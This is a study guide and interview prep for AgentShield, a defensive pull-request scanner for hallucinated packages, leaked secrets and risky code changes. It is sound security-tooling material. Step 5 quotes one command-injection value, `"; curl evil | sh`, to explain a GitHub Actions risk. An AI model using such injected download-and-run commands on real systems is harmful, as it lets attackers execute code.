# AgentShield study guide

How to read this codebase, the ideas behind it, and the questions you're
likely to get about it. Read it with the code open. `DECISIONS.md` has the
"why" behind every choice (numbered #1–#45), and this guide points to it.

**Plan:** Part 1 is the reading order. Part 2 explains the six core concepts
in plain English. Part 3 goes step by step through the roadmap with five
interview questions each. Part 4 is the 60-second pitch and the numbers to
know by heart.

---

## Part 1: reading order

About 1,900 lines of Python, standard library only. Read in this order. Each
file only depends on files above it.

| # | File | What to understand | Time |
|---|---|---|---|
| 1 | `agentshield/findings.py` | The `Finding` every check returns; `Severity` weights; `risk_score()` | 5 min |
| 2 | `agentshield/diff.py` | How a unified diff becomes `FileDiff` objects with real line numbers | 15 min |
| 3 | `agentshield/cli.py` | `scan()` runs every check and merges results; `main()` handles flags and exit codes | 10 min |
| 4 | `agentshield/similarity.py` | Edit distance (dynamic programming) for typosquats | 15 min |
| 5 | `agentshield/registry.py` | Asking PyPI/npm "does this exist, how old is it?"; the injectable fetcher | 10 min |
| 6 | `agentshield/checks/packages.py` | Extract deps → filter local/stdlib → look up in parallel → judge | 30 min |
| 7 | `agentshield/checks/secrets.py` | Regex per key format, entropy fallback, placeholders, masking | 25 min |
| 8 | `agentshield/paths.py` | What counts as a test, fixture or source file | 5 min |
| 9 | `agentshield/checks/risky.py` | Eight rules plus the "is this code or just text?" helpers | 30 min |
| 10 | `agentshield/config.py` | `.agentshield.toml` and inline `# agentshield: ignore` | 15 min |
| 11 | `agentshield/report.py` | Text / markdown / JSON output | 5 min |
| 12 | `action.yml` + `agentshield/github_comment.py` | Running in CI and commenting on the PR | 20 min |
| 13 | `bench/` (`collect` → `run` → `show` → `report` → `planted`) | How the numbers were measured | 30 min |
| 14 | `tests/` | One test file per module; `helpers.py`, `fake_registry.py` | skim |

**Try it while reading:**

```bash
python examples/demo.py                    # the demo from the README
python examples/demo.py --format json      # same, as data
python -m unittest discover -s tests -t . -v
```

**The one-sentence architecture:** a diff goes in, gets parsed into "lines
that were added (and removed), with line numbers", each check turns that into
`Finding`s, config drops the ignored ones, and a renderer prints them with
a score.

---

## Part 2: the six core concepts

### 2.1 Diffs (what a code change looks like as text)

`git diff` prints changes in **unified diff** format:

```
diff --git a/app.py b/app.py          <- a new file section starts
--- a/app.py                          <- old version ("a" side)
+++ b/app.py                          <- new version ("b" side)
@@ -10,4 +10,5 @@ def main():        <- hunk header
     unchanged line                   <- context (space): in both versions
-    removed line                     <- only in the old version
+    added line                       <- only in the new version
```

The **hunk header** `@@ -10,4 +10,5 @@` means: in the old file this chunk
starts at line 10 and spans 4 lines; in the new file it starts at line 10
and spans 5. `diff.py` reads the new-file start (`+10`) and counts forward:
context lines and added lines move the counter, removed lines don't (they
aren't in the new file). That's how every finding gets a real line number like
`app.py:12`.

Special cases in `parse_diff`:
- `--- /dev/null` means a brand-new file; `+++ /dev/null` means a deleted file.
- A line that *starts with* `---` inside a hunk is a removed line, not a header
  (that's what `in_hunk` is for; see the SQL comment test in `test_diff.py`).
- Removed lines record the new-file line they sat above (#19), so "an auth
  check was removed **here**" can point somewhere.

**Why diffs instead of the whole repo (#2):** reviewers care about what this
change introduces; it's fast; findings point at new lines only.

**Three-dot diff (#28):** `git diff main...HEAD` = changes since the branch
split from `main`. Two dots would also show everything merged into main
since then, which isn't this PR's work.

### 2.2 Regular expressions

A regex is a pattern for text. The pieces used most here:

| Piece | Means | Example |
|---|---|---|
| `\b` | word boundary | `\bAKIA` won't match inside `XAKIA` |
| `[0-9A-Z]{16}` | exactly 16 of these characters | AWS key body |
| `(?:...)` | group without capturing | `(?:AKIA\|ASIA)` |
| `(...)` | capturing group | `m.group(1)` gives the secret part |
| `(?i)` / `(?i:...)` | case-insensitive (whole pattern / just a part) | SQL `drop table` |
| `(?<![\w.])eval\(` | **lookbehind**: not preceded by a letter or dot | matches `eval(x)`, not `model.eval()` |
| `(?!ant-)` | **lookahead**: not followed by | `sk-` (OpenAI) but not `sk-ant-` (Anthropic) |
| `.+?` | lazy: as few chars as possible | test names in quotes |
| `(['"])(.+?)\2` | backreference: close with the *same* quote | `"it's fine"` isn't cut at the apostrophe |

Two regex lessons from this project:
- **Performance (#17).** An unanchored `[\w.-]*(secret|token)` is retried at
  every character position in the line, which made the secret scan 2.4× slower.
  Anchoring the start with `(?<![\w.-])` and a cheap keyword pre-check fixed it.
- **Regexes can't tell code from text.** `"never use eval()"` matches the
  eval rule. That's why `risky.py` has `_in_string()` and
  `_docstring_lines()` (#26): a rule only fires if the match starts in code.

### 2.3 Shannon entropy (how random does a string look?)

Entropy measures surprise per character:

  **H = −Σ p(c) · log₂ p(c)**, summed over each distinct character c,
  where p(c) = (count of c) / (length).

Worked examples:
- `"aaaa"`: one symbol with p = 1 → H = −1·log₂1 = **0 bits**. No surprise.
- `"abcd"`: four symbols, each p = ¼ → H = −4·(¼·log₂¼) = −4·(¼·−2) = **2 bits**.
- A random 32-character base-62 key: about **4.4 bits**; English-like
  identifiers: about 3.2–3.9.

The catch (#13): a 20-char random key scores 3.9, but so does
`app.settings.SECRET_KEY`. Entropy alone can't separate them, so the check
only runs on values assigned to secret-sounding names, needs ≥ 16 chars, a
letter **and** a digit, no URL/path, and ≥ 3.5 bits/char. Known key formats are
checked first by regex; entropy is the fallback for unknown formats (#12).

### 2.4 Edit distance (how many typos apart?)

**Optimal string alignment distance**: the fewest single-character inserts,
deletes, substitutions or *swaps of neighbours* to turn one string into
another. `requests → reqeusts` = 1 (swap), `numpy → numpi` = 1 (substitute).

Computed with **dynamic programming**: `d[i][j]` = distance between the first
`i` letters of `a` and the first `j` letters of `b`:

```
d[i][j] = min( d[i-1][j]   + 1,      # delete a[i-1]
               d[i][j-1]   + 1,      # insert b[j-1]
               d[i-1][j-1] + cost )  # substitute (cost 0 if letters equal)
and, if the last two letters are swapped:
d[i][j] = min(d[i][j], d[i-2][j-2] + 1)
```

Table for `cat → cut` (answer in the bottom-right cell):

```
      ""  c  u  t
  ""   0  1  2  3
  c    1  0  1  2
  a    2  1  1  2
  t    3  2  2  1   <- distance 1 (substitute a→u)
```

Time and memory O(n·m). Fine, because package names are short and
`closest()` skips any candidate whose length differs by more than the limit.

**Thresholds (#6):** names under 4 characters are never flagged; 4–6 allow 1
edit; longer allow 2. Short names collide by accident (`six`/`sip`).
Look-alike = MEDIUM; look-alike **and** under 30 days old = HIGH, because
that pairing is what real attacks look like.

### 2.5 CI and GitHub Actions

**CI (continuous integration)** = a server runs checks on every push or PR,
so problems are caught before merging. **GitHub Actions** is GitHub's CI:
YAML files in `.github/workflows/` describe *when* (events like
`pull_request`) and *what* (jobs → steps).

Vocabulary used here:
- **Workflow**: a YAML file (`ci.yml` runs the tests on Python 3.11–3.13;
  `agentshield.yml` makes AgentShield scan its own PRs).
- **Action**: a reusable step. `action.yml` makes this repo usable as
  `uses: OWNER/agentshield@v1`. It's a **composite** action: plain shell
  steps, no Docker (#27).
- **`GITHUB_TOKEN`**: an automatic, short-lived token. `permissions:`
  limits what it can do (`contents: read`, `pull-requests: write`).
- **Exit codes** are how CI knows pass/fail: 0 = pass, 1 = findings at or
  above `--fail-on`, 2 = couldn't run (#21, #31).
- **Job summary** (`$GITHUB_STEP_SUMMARY`): markdown shown on the run page.

Security points worth knowing cold (#30):
- `pull_request` vs `pull_request_target`: the latter runs with a **write**
  token even for PRs from forks. Combined with checking out the fork's code,
  that's a classic way repos get hijacked. AgentShield uses `pull_request`;
  fork PRs just don't get a comment.
- Never put `${{ inputs.x }}` inside `run:` scripts. GitHub pastes it into
  the script text before bash runs, so a crafted value can inject commands.
  Pass inputs through `env:`.

### 2.6 Precision, recall and confidence intervals

For a detector:

|                   | Really a problem | Not a problem |
|---|---|---|
| **Flagged**       | True positive (TP) | False positive (FP) |
| **Not flagged**   | False negative (FN) | True negative |

- **Precision** = TP / (TP + FP): *when it speaks, is it right?*
  Held-out: 18 / 25 = **72%**.
- **Recall** = TP / (TP + FN): *of the real problems, how many did it catch?*
  Planted: 32 / 32 in scope.

Why both: you can get 100% recall by flagging every line (useless), or
near-100% precision by almost never flagging (also useless). Security tools
die from low precision: people learn to ignore them (#18).

**Confidence interval.** 18/25 is a small sample. If the "true" precision
were 72%, another 25 findings could easily give 15/25 or 21/25. The **Wilson
score interval** gives a plausible range, **52%–86%** at 95%:

```
centre = (p + z²/2n) / (1 + z²/n)
half   = z·√( p(1−p)/n + z²/4n² ) / (1 + z²/n)        z = 1.96 for 95%
p = 0.72, n = 25 → centre ≈ 0.691, half ≈ 0.166 → [0.52, 0.86]
```

The textbook "Wald" interval `p ± 1.96·√(p(1−p)/n)` misbehaves for small n or p
near 0/1. For 0/13 it gives [0%, 0%], claiming certainty, while Wilson gives
[0%, 23%] (#37).

**Train/test split (#34):** tuning on data and then reporting on the same
data inflates the number (overfitting). Here the dev set (September PRs) was
used to find and fix false positives; the test set (August PRs) was collected
afterwards and scanned once. Only the test number is the headline.

---

## Part 3: step by step, with interview questions

### Step 1: package checker (`packages.py`, `registry.py`, `similarity.py`)

**What it does:** for every dependency the diff adds (requirements.txt,
pyproject.toml, package.json, Python/JS imports), filter out the standard
library, Node built-ins, relative imports and the repo's own modules, look the
rest up on PyPI/npm (8 threads, cached), then judge: 404 → hallucinated;
first release < 30 days → new; 1–2 edits from a popular name → typosquat;
npm `0.0.1-security` stub → removed malware.

Key ideas: manifest = HIGH, import = MEDIUM (#4); never say "doesn't exist"
without a 404 (#5); popular names skip the network (#7); the fetcher is a
parameter so tests use `fake_registry.py`.

**Q1. What is slopsquatting, and how does AgentShield detect it?**
> LLMs sometimes invent plausible package names. Attackers notice which
> names get hallucinated, register them, and ship malware, so the next person
> who trusts the AI installs it. AgentShield checks every new dependency
> against PyPI/npm: a 404 means nobody owns the name yet (so anyone could),
> and a package under 30 days old gets flagged because a freshly registered
> hallucinated name looks exactly like that.

**Q2. Why is a missing package in requirements.txt HIGH but a missing import only MEDIUM?**
> The manifest is what actually gets installed, so a wrong name there is
> directly exploitable. An import name can legitimately differ from its
> package name (`import yaml` installs `pyyaml`, `import paho` installs
> `paho-mqtt`), so "no package called X" is less certain. A mapping file
> handles the common cases, but there's still more uncertainty. (#4)

**Q3. What happens if PyPI is down?**
> The lookup raises, `Registry.lookup` catches it and returns
> `exists=None`, and the check turns that into a *note* ("couldn't verify
> …"), never a finding. Claiming "this package doesn't exist" when we didn't
> actually check would be a false alarm, and false alarms destroy trust in
> a security tool. Only an explicit 404 counts. (#5)

**Q4. Walk me through the typosquat algorithm and its complexity.**
> Optimal string alignment distance by dynamic programming: a table where
> each cell is the min of delete, insert and substitute from neighbouring
> cells, plus a swap case. It's O(n·m) per pair. We compare against the
> ~150–190 popular names of that ecosystem, skip pairs whose length difference already exceeds the
> limit, and limit by length: under 4 chars never, 4–6 one edit, longer two,
> because short names collide by accident. (#6)

**Q5. How did you test code that calls the internet?**
> The `Registry` takes a `fetch` function as a parameter (dependency
> injection). Production passes `http_fetch`; tests pass `fake_fetch`, a
> dictionary pretending to be PyPI/npm, or `broken_fetch`, which raises. So the
> tests are fast, deterministic and offline, and I can simulate a network
> failure on demand. Then I also ran it against the real registries once and
> cross-checked each verdict with curl. That caught `import ruamel.yaml`
> being looked up as `ruamel`. (#10)

### Step 2: secret scanner (`secrets.py`)

**What it does:** layer 1 is a regex per known key format (AWS `AKIA…`,
GitHub `ghp_…`, Anthropic `sk-ant-…` before OpenAI `sk-…`, Stripe
`sk_live_…`, Slack `xoxb-…`, Google `AIza…`, JWT `eyJ….eyJ….…`, private key
headers, `postgres://user:pass@host`). Layer 2 is entropy on secret-named
variables. Placeholders, Stripe test keys, lockfiles and local-dev DB URLs are
skipped; test/fixture files are downgraded to LOW; output is masked.

**Q1. Why not just use entropy to find secrets?**
> Lots of legitimate strings are random: hashes, UUIDs, lockfile integrity
> checksums, base64 images. I measured it: a random 20-char key scores 3.9
> bits/char, and so does `app.settings.SECRET_KEY`. So known formats go
> first (a prefix match is near-certain), and entropy only runs on values
> assigned to names like `api_key`/`token`/`password`, with extra rules
> (≥ 16 chars, letter + digit, not a URL). (#12, #13)

**Q2. How do you avoid false positives from placeholders and tests?**
> Values containing `xxx`, `your`, `example`, `changeme`, `<...>`, `${...}`,
> or one repeated character are skipped. That covers the AWS docs key
> `AKIAIOSFODNN7EXAMPLE`. Stripe test keys can't move money, so they're
> safe. In test and fixture files, known-format hits are downgraded to
> LOW rather than skipped, because real keys do leak in tests, and the entropy
> layer is off there. A note tells the reviewer. (#14)

**Q3. Why mask the secret in the report? It's already in the diff.**
> The report gets pasted into PR comments, CI logs and Slack, which reach far
> more people than the diff. A security tool shouldn't spread the leak
> further. We show the first 4 characters (enough to identify which key to
> rotate), or none for short secrets like passwords, where 4 characters would
> give away too much. (#16)

**Q4. If someone commits a key and then deletes it in the next commit, are they safe?**
> No. It's in git history and probably in forks, CI caches and clones.
> The only real fix is to revoke/rotate the key, which is why every secret
> finding's "fix" says to rotate it and explains that deleting the line isn't
> enough.

**Q5. How did you make sure the scanner is fast and doesn't flag itself?**
> I treated the whole Python standard library (445k lines) as one diff: zero
> findings, but 7.9 s. Profiling showed one regex was 90% of the time, an
> unanchored `[\w.-]*` retried at every character. Anchoring it and adding
> a cheap keyword pre-check brought it to 3.3 s (about 7 µs per line). For
> self-flagging: tests build fake keys at runtime (`"AKIA" + fake_secret(16)`),
> so the repo never contains a key-shaped string, which also keeps GitHub
> push protection quiet. (#16, #17)

### Step 3: risky-change rules (`risky.py`, `paths.py`)

**What it does:** eight rules: removed auth guard, auth file touched,
destructive migration (outside `downgrade()`), test deleted (net loss),
test skipped / `.only`, sizeable source change with no tests, insecure
setting (`verify=False`, `DEBUG=True`, CORS `*`…), dangerous call (`eval`,
`shell=True`, `pickle.loads`…). Most are MEDIUM ("a human should look"),
destructive migrations HIGH.

**Q1. Dropping a column is often intentional. Why flag it, and why HIGH?**
> Because it's irreversible: once it runs in production the data is gone,
> so a second look is cheap insurance. It's HIGH for that reason, but the rule
> skips `downgrade()`/`exports.down`/`*.down.sql`, where dropping just
> reverses a create, and the fix suggests the safe pattern: stop using the
> column first, drop it in a later deploy. (#18, #20)

**Q2. How do you tell `eval(x)` from the string `"never use eval()"`?**
> `_in_string()` walks the line tracking open quotes (including triple
> quotes and escapes), and a rule only fires if its match *starts* outside a
> string. `_docstring_lines()` tracks multi-line docstrings by counting
> triple quotes. I added these after running AgentShield on its own repo, which
> produced 21 false positives, all from messages and docstrings that mention
> risky code. Afterwards: 0. A few rules are allowed to match inside strings
> because their evidence *is* a string, like SQL in `op.execute("DROP TABLE x")`.
> (#26)

**Q3. What did the benchmark teach you about the test rules?**
> On real PRs every `t.Skip`/`self.skipTest` I flagged was inside an `if`
> ("skip on Windows"), which is legitimate. So body-level skips now only count
> when they're the test's first statement. And every "test deleted" was
> really a test renamed in place to match new behaviour, so the rule now only
> fires on a *net loss* of tests in a file. (#35)

**Q4. Why is "source changed with no tests" only LOW?**
> It's true by construction (we can see no test file changed) but not always
> important: refactors, comment changes and constants don't need new tests.
> It's information for the reviewer, not a blocker. In the benchmark it was
> the most common finding, at 79% precision. Whether it should be off by
> default is an open question in DECISIONS.

**Q5. What are the limits of a regex/line-based approach versus a real parser?**
> Lines can't see data flow: `cp.exec(cmd)` via an alias is missed, and so is
> code split across lines. A string-tracking heuristic per line can be fooled
> by an apostrophe in a trailing comment. A real parser (Python `ast`,
> tree-sitter) would fix that but means one parser per language and
> dependencies. Line rules work on any language in the diff, are fast, and
> their failure mode is mostly staying quiet. The benchmark's planted
> "out-of-scope" cases document exactly these misses.

### Step 4: configuration (`config.py`)

**What it does:** reads `.agentshield.toml` (`ignore_paths`,
`ignore_rules`, `allow_packages`, `fail_on`, `fail_score`,
`new_package_days`) with `tomllib`; inline `# agentshield: ignore[rule]`
silences one line; every hidden finding is counted in a note.

**Q1. Why does a security tool need ways to silence it?**
> Without a cheap escape hatch for a false positive, teams disable the whole
> tool. Project-wide config lives in the repo, so changing policy goes
> through code review; inline ignores sit next to the code where a reviewer
> sees them. And nothing is hidden silently: the report counts suppressed
> findings. (#23, #24)

**Q2. Why are unknown config keys an error instead of being ignored?**
> A typo like `ignore_path` (missing "s") would otherwise silently do nothing,
> and you'd believe a path is excluded when it isn't, or the reverse. Failing
> loudly (exit code 2) is safer. (#24)

**Q3. Why did you raise the minimum Python version to 3.11?**
> `tomllib` (TOML parsing) is only in the standard library from 3.11, and
> the project is stdlib-only. The alternatives were writing a TOML parser
> (lots of edge cases) or using JSON/INI (worse to edit by hand). Python 3.10
> reaches end-of-life in October 2026 anyway. I tested on real 3.11 and 3.12
> interpreters. (#22)

**Q4. How does `"secret"` in `ignore_rules` work, and why not plain `startswith`?**
> A pattern matches a rule exactly or as a whole dotted prefix: `"secret"` or
> `"secret.*"` covers `secret.jwt`, but not a hypothetical `secretive.x`.
> Plain `startswith("secret")` would match that by accident. (#25)

**Q5. How do CLI flags and the config file interact?**
> CLI wins: `--fail-on high` overrides `fail_on = "medium"`. The default for
> `--fail-on` is `None` so we can tell "user didn't pass it" from "user
> passed high". `--fail-on never` also disables `fail_score`. All of this is
> tested end-to-end through `cli.main` with a real config file in a temp
> directory. (#25)

### Step 5: GitHub Action (`action.yml`, `github_comment.py`, workflows)

**What it does:** a composite action installs AgentShield from its own folder,
scans `origin/<base>...HEAD` (fetching history if the checkout is shallow),
writes the job summary, posts or edits one PR comment, then fails the check
if needed.

**Q1. How do you avoid posting a new comment on every push?**
> Our comment carries an invisible HTML marker, `<!-- agentshield-report -->`.
> Each run pages through the PR's comments looking for it, then edits that
> comment (PATCH) if it exists, or creates one (POST). Ten pushes give one
> comment that's always current. (#29)

**Q2. Why not `pull_request_target` so fork PRs can get comments too?**
> `pull_request_target` runs with a write token and secrets even for PRs
> from forks. If the workflow also checks out the fork's code, an attacker's
> PR can run code with write access to your repo. It's a well-known class of
> GitHub Actions vulnerability. I kept `pull_request` and accepted the
> trade-off: fork PRs get the report in the job summary plus a warning
> instead of a comment. (#30)

**Q3. What's the injection risk in Actions YAML, and how did you avoid it?**
> `${{ ... }}` expressions are substituted into the script *text* before
> the shell runs, so a value containing `"; curl evil | sh` becomes code.
> All inputs are passed via `env:` and used as `"$INPUT_X"`, so they're
> just data. Every `run:` block also passes shellcheck. (#30, #32)

**Q4. The checkout is shallow by default. Why does that matter?**
> `git diff base...HEAD` needs the merge base, the commit where the branch
> split off. A one-commit shallow clone doesn't have it, so git fails with
> "no merge base". The action detects a shallow repo and fetches the history
> itself, with a notice. I found this by simulating a shallow clone locally.
> (#28)

**Q5. How did you test the Action without pushing to GitHub?**
> Three layers. Unit tests for the comment logic against a fake GitHub API
> (create, update, pagination, 403 from forks). `actionlint` on the
> workflows plus `shellcheck` on every script in `action.yml`. And an
> end-to-end simulation: a bare "origin" repo, a PR branch with a leaked key,
> the action's steps run with GitHub's environment variables, and a local
> HTTP server pretending to be the GitHub API. It verified the comment was
> created, then *updated* on the second run, and that the check failed. The one
> thing not yet verified is a run on real GitHub. (#32)

### Step 6: benchmark (`bench/`)

**What it does:** 285 real public PRs (dev set: September 2026; held-out
test set: August 2026), each about 63% AI-assisted, chosen by a written
rule. Every finding is labeled TP/FP with written criteria and a reason;
recall is measured by planting 32 realistic problems into real PRs; scan
time is recorded.

**Q1. What are your precision and recall, and how did you measure them?**
> On 143 held-out PRs the tool made 25 findings; 18 were right, so 72%
> precision, with a 95% Wilson interval of 52–86% because the sample is small.
> Real PRs rarely contain leaked keys or hallucinated packages, so recall on
> them would be meaningless. I planted 32 realistic in-scope problems into
> real PRs, among real code, and all 32 were found. That's an upper bound,
> since I wrote both the rules and the plants. Six out-of-scope cases were all
> missed, which documents the limits. (Part 4 has the exact sentence for a resume.)

**Q2. How did you avoid fooling yourself with the benchmark?**
> Four things. PRs were selected by a written rule, not by hand. The labeling
> criteria were written *before* labeling. I used a dev/test split: I fixed
> bugs using the September set, then collected the August set and scanned it
> once with the frozen tool. And when the held-out set revealed 3 more bugs,
> I fixed them but kept the pre-fix 72% as the headline, because the set
> wasn't held-out anymore. (#34, #39)

**Q3. What was the biggest source of false positives, and how did you fix it?**
> JavaScript monorepos. Imports like `@workspace/db`, `@components/button`
> and `bun:test` look like npm packages but are workspace packages, tsconfig
> path aliases and runtime built-ins. The fix uses the repo's file list:
> a folder with its own `package.json` is a workspace package, and a scope
> matching a local folder is an alias, unless it's a known public scope like
> `@types`. That removed 20 false positives and 0 true positives, taking dev
> precision from 36% to 74%. (#35)

**Q4. Why report a confidence interval instead of just "72%"?**
> With 25 findings, one label changing moves the number by 4 points. The
> interval says honestly that the true rate is plausibly 52–86%. I used the
> Wilson interval because the simple formula breaks down for small samples
> and for rates near 0% or 100%. For example, it gives a zero-width interval
> for 0/13. (#37)

**Q5. What went wrong while building the benchmark?**
> Two things worth telling. GitHub rate-limited the diff downloads (HTTP 429),
> and my collector silently skipped 103 PRs, which changes which PRs get
> selected. I added retry-with-backoff and re-collected before running the
> tool. My planting harness also had bugs: it wrote `from fastapi-jwt-guardian
> import ...` (invalid Python), and it planted code into lockfiles, test files
> and even inside a docstring, places where the tool is *designed* to stay
> quiet. Fixing the harness wasn't cheating because the tool didn't change,
> but I documented each fix. (#36, #38)

### Step 7: polish (README, demo, packaging)

**What it does:** README rewrite, a demo GIF recorded from the real CLI, a
word-wrapped text report, LICENSE and package metadata, and verified builds.
Publishing is blocked on a name decision.

**Q1. Is the demo GIF real?**
> Yes. `examples/record_demo.py` runs the installed CLI inside a
> pseudo-terminal, so colours and wrapping are exactly what a user sees, and
> writes an asciinema recording; `agg` renders it to a GIF. A unit test runs
> the same demo, so the README can't silently go stale. (#42)

**Q2. Why isn't it on PyPI?**
> The name `agentshield` is already taken by an unrelated project. Publishing
> under a near-identical name, or telling users to `pip install agentshield`,
> would send them to someone else's code, which is the exact confusion this
> tool warns about. It needs a distinct distribution name; the command can
> stay `agentshield`. (#41)

**Q3. How did you check the package works before publishing?**
> Built the sdist and wheel, ran `twine check`, inspected the wheel's
> contents (package and data files only), then installed it into a fresh
> Python 3.11 environment and ran a scan from an unrelated directory. That
> proves the data files load through `importlib.resources` rather than paths
> relative to my checkout. (#44)

**Q4. Why standard-library only?**
> A supply-chain security tool that pulls in dependencies adds the very risk
> it checks for, and every dependency is something users must trust and
> update. No dependencies also means the GitHub Action installs in about a
> second. The cost was writing small things myself (HTTP via `urllib`, the
> Wilson interval, the diff parser). (#3)

**Q5. If you had another month, what would you do?**
> Get an independent person to re-label the benchmark and measure agreement
> (Cohen's kappa). Collect a fresh held-out set to measure the post-fix
> version. Decide whether `no-tests` should only fire in repos that already
> have tests. Use a real parser (Python `ast`) for the Python rules to handle
> aliases and multi-line calls. Add Go and Rust package checks. Publish under a
> free name with the Action on the Marketplace.

---

## Part 4: the pitch and the numbers

**60 seconds:** "AI coding tools make predictable mistakes: they import
packages that don't exist, which attackers then register with malware; they
paste in real API keys; they delete failing tests. I built AgentShield, a
dependency-free Python CLI and GitHub Action that scans a pull request's diff
for these and gives each finding a concrete fix and a risk score. The part I'm
proudest of is the evaluation: I benchmarked it on 285 real public PRs with a
dev/test split. The dev set exposed false positives from JavaScript
monorepos, which I fixed, taking precision from 36% to 74%. On a held-out set
it was 72% precise with a confidence interval, and it caught all 32 planted
problems."

**Numbers to know:**

| | |
|---|---|
| Code | ~1,900 lines of Python, 0 dependencies, 96 tests |
| Checks | 3 families, 24 rule ids |
| Held-out precision | 18/25 = 72% (95% CI 52–86%) |
| Dev precision | 36% → 74% after fixes (20 FPs removed, 0 TPs lost) |
| Planted recall | 32/32 in scope (upper bound); 0/6 out of scope |
| Speed | ~10 ms per PR + registry lookups; secret scan of 445k stdlib lines in 3.3 s |
| Self-scan | 21 false positives on its own code → 0 |

**Before putting numbers on a resume:** spot-check `bench/labels.csv`
(labels were assigned by Claude; every row has a reason). If you disagree
with any, change the label and re-run `python bench/report.py`.
